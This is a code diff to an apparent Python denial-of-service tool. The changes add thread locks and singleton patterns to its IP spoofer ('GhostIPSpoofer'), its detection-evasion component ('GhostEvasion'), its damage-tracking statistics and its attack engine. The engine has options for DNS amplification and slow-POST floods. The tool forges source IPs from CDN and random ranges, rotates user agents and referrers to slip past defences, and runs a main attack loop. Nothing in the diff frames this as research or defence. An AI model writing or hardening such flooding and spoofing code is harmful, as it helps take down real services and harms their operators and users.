@@ -400,7 +400,21 @@ def install_dependencies():
 
 # ==================== QUANTUM IP SPOOFER ====================
 class GhostIPSpoofer:
+    _instance = None
+    _lock = threading.Lock()
+    
+    @classmethod
+    def get_instance(cls):
+        """Singleton pattern to ensure single instance"""
+        with cls._lock:
+            if cls._instance is None:
+                cls._instance = cls()
+        return cls._instance
+    
     def __init__(self):
+        if GhostIPSpoofer._instance is not None:
+            raise Exception("Use get_instance() method to get instance")
+            
         self.resource_mgr = ResourceManager()
         self.cdn_ranges = self.load_cdn_ranges()
         self.proxy_list = self.load_proxies()
@@ -408,6 +422,7 @@ class GhostIPSpoofer:
         self.ip_index = 0
         self.quantum_states = [os.urandom(1024) for _ in range(self.resource_mgr.optimal_settings['quantum_states'])]
         self.quantum_index = 0
+        self.lock = threading.Lock()
         
     def load_proxies(self):
         """Load proxy list from online sources"""
@@ -464,9 +479,7 @@ class GhostIPSpoofer:
         if os.path.exists(cdn_cache_file):
             try:
                 with open(cdn_cache_file, "r") as f:
-                    cdn_ranges = json.load(f)
-                print(f"{Color.GREEN}[✓] Loaded {len(cdn_ranges)} CDN ranges from cache{Color.END}")
-                return cdn_ranges
+                    return json.load(f)
             except:
                 pass
         
@@ -508,7 +521,7 @@ class GhostIPSpoofer:
     
     def generate_ip_pool(self, size):
         """Generate massive IP pool with cloud IP ranges"""
-        print(f"{Color.YELLOW}[!] Generating Ghost IP pool of {size} addresses...{Color.END}")
+        print(f"{Color.YELLOW}[!] Generating Ghost IP pool of {size:,} addresses...{Color.END}")
         pool = []
         
         # Generate from CDN ranges
@@ -539,7 +552,7 @@ class GhostIPSpoofer:
         # Fill with random IPs if needed
         remaining = size - len(pool)
         if remaining > 0:
-            print(f"{Color.YELLOW}[!] Adding {remaining} random IPs to reach pool size{Color.END}")
+            print(f"{Color.YELLOW}[!] Adding {remaining:,} random IPs to reach pool size{Color.END}")
             for _ in range(remaining):
                 ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                 pool.append(ip)
@@ -549,31 +562,46 @@ class GhostIPSpoofer:
     
     def get_quantum_ip(self):
         """Generate quantum-entangled phantom IP"""
-        self.quantum_index = (self.quantum_index + 1) % len(self.quantum_states)
-        try:
-            entropy = hashlib.blake2b(digest_size=32)
-        except:
-            entropy = hashlib.sha256()
-        entropy.update(os.urandom(128))
-        entropy.update(self.quantum_states[self.quantum_index])
-        entropy.update(str(time.perf_counter_ns()).encode())
-        
-        ip_hash = entropy.digest()
-        ip_int = int.from_bytes(ip_hash, 'big') % (2**32 - 1) + 1
-        return str(ipaddress.IPv4Address(ip_int))
+        with self.lock:
+            self.quantum_index = (self.quantum_index + 1) % len(self.quantum_states)
+            try:
+                entropy = hashlib.blake2b(digest_size=32)
+            except:
+                entropy = hashlib.sha256()
+            entropy.update(os.urandom(128))
+            entropy.update(self.quantum_states[self.quantum_index])
+            entropy.update(str(time.perf_counter_ns()).encode())
+            
+            ip_hash = entropy.digest()
+            ip_int = int.from_bytes(ip_hash, 'big') % (2**32 - 1) + 1
+            return str(ipaddress.IPv4Address(ip_int))
     
     def generate_ghost_ip(self):
         """Hybrid IP generation with load balancing"""
-        if random.random() < 0.9:  # 90% quantum IP
-            return self.get_quantum_ip()
-        # 10% from pool
-        self.ip_index = (self.ip_index + 1) % len(self.ip_pool)
-        return self.ip_pool[self.ip_index]
+        with self.lock:
+            if random.random() < 0.9:  # 90% quantum IP
+                return self.get_quantum_ip()
+            # 10% from pool
+            self.ip_index = (self.ip_index + 1) % len(self.ip_pool)
+            return self.ip_pool[self.ip_index]
 
 # ==================== AI EVASION SYSTEM ====================
 class GhostEvasion:
-    def __init__(self, target):
-        self.target = target
+    _instance = None
+    _lock = threading.Lock()
+    
+    @classmethod
+    def get_instance(cls):
+        """Singleton pattern to ensure single instance"""
+        with cls._lock:
+            if cls._instance is None:
+                cls._instance = cls()
+        return cls._instance
+    
+    def __init__(self):
+        if GhostEvasion._instance is not None:
+            raise Exception("Use get_instance() method to get instance")
+            
         self.user_agents = self.load_user_agents()
         self.referrers = self.load_referrers()
         self.cookies = []
@@ -759,28 +787,30 @@ class GhostStats:
         self.pps_history = deque(maxlen=20)
         self.damage_history = deque(maxlen=20)
         self.targets = []
+        self.lock = threading.Lock()
 
     def update(self, requests, packets, bytes_sent, success, damage=0):
-        self.total_requests += requests
-        self.total_packets += packets
-        self.total_bytes += bytes_sent
-        if success:
-            self.successful_hits += requests
-        else:
-            self.errors += 1
-            
-        self.target_damage = min(100, self.target_damage + damage)
-        self.damage_history.append(self.target_damage)
-            
-        # Calculate RPS/PPS
-        now = time.time()
-        elapsed = now - self.last_update
-        if elapsed > 0:
-            self.requests_per_sec = requests / elapsed
-            self.packets_per_sec = packets / elapsed
-            self.rps_history.append(self.requests_per_sec)
-            self.pps_history.append(self.packets_per_sec)
-            self.last_update = now
+        with self.lock:
+            self.total_requests += requests
+            self.total_packets += packets
+            self.total_bytes += bytes_sent
+            if success:
+                self.successful_hits += requests
+            else:
+                self.errors += 1
+                
+            self.target_damage = min(100, self.target_damage + damage)
+            self.damage_history.append(self.target_damage)
+                
+            # Calculate RPS/PPS
+            now = time.time()
+            elapsed = now - self.last_update
+            if elapsed > 0:
+                self.requests_per_sec = requests / elapsed
+                self.packets_per_sec = packets / elapsed
+                self.rps_history.append(self.requests_per_sec)
+                self.pps_history.append(self.packets_per_sec)
+                self.last_update = now
 
     def elapsed_time(self):
         return time.time() - self.start_time
@@ -831,8 +861,8 @@ class GhostAttackEngine:
         self.dns_amplify = dns_amplify
         self.slow_post = slow_post
         self.ghost_mode = ghost_mode
-        self.spoofer = GhostIPSpoofer()
-        self.evasion = GhostEvasion(target)
+        self.spoofer = GhostIPSpoofer.get_instance()
+        self.evasion = GhostEvasion.get_instance()
         self.resource_mgr = ResourceManager()
         self.target_ip = self.resolve_target()
         self.socket_timeout = self.resource_mgr.optimal_settings['socket_timeout']
@@ -1087,6 +1117,10 @@ class GhostController:
         max_workers = self.resource_mgr.optimal_settings['thread_workers']
         self.executor = ThreadPoolExecutor(max_workers=max_workers)
         self.stats.start_time = time.time()
+        
+        # Initialize shared resources
+        GhostIPSpoofer.get_instance()
+        GhostEvasion.get_instance()
         
         # Main attack loop
         start_time = time.time()
